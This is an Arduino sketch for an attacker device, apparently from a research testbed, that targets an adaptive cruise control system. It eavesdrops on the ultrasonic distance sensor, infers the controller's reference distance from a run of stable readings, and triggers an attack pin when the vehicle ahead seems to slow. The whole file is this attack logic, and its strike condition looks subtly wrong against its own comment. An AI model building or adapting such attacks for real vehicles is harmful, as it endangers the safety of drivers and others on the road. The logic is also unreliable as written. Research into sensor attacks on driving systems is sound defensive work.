//pin definitions for ultrasonic sensor
#define TRIG_PIN 14
#define ECHO_PIN 15
#define CTRL_PIN 13

//status of the attacker
//0 = the ACC does not seem to have reached the reference distance
//1 = the ACC has reached the reference distance
//2 = the attack has been performed
int status = 0;

//acceptable distance between two measures
const double delta = 0.8;
//number of consecutive measures that need to be accepted to consider the reference distance reached
const int goal_num = 400;
//distance between a distance and the estimated reference distance needed to perform the attack
const double strike_distance = 1.0;

//variables for the algorithm
int valid_reads = 0;
double last_read = 0;
double current_read = 0;

time_t time0 = micros();

//function to perform the attack
void strike();

void setup() {
  Serial.begin(9600);
  
  //initialize pins
  pinMode(TRIG_PIN, INPUT);
  pinMode(ECHO_PIN, INPUT);
  pinMode(CTRL_PIN, OUTPUT);

}

void loop() {
  //check if the sensor is sensing and eventually read from it
  if(digitalRead(TRIG_PIN)){
    //method similar to measure() in PID.ino
    delayMicroseconds(15);
    double duration = pulseIn(ECHO_PIN, HIGH);
    double distance = (duration*.0343)/2;
    current_read = (distance <= 400) ? distance : current_read;


    time_t t1 = micros() - time0;
    Serial.print(t1);
    Serial.print(", ");
    Serial.print(current_read);
    Serial.print(", ");
    Serial.println(status);

    if(status == 0){
      //check if the measure could be one of a stable system
      if(abs(current_read - last_read) <= delta) valid_reads++;
      else valid_reads = 0;

      last_read = current_read;

      if(valid_reads >= goal_num) status = 1;
      //if the system has reached the reference distance, the last measure should
      //be the reference distance of the ACC
    }
    else{
      //if the system has reached the reference and the latest measure is at least strike_distance shorter than the 
      //reference signal the object in front has probably slowed down, so it is a good
      //moment to strike the attack
      if((current_read - last_read) <= strike_distance) strike();
    }

  }

}

void strike(){
  digitalWrite(CTRL_PIN, 1);
  status = 2;
}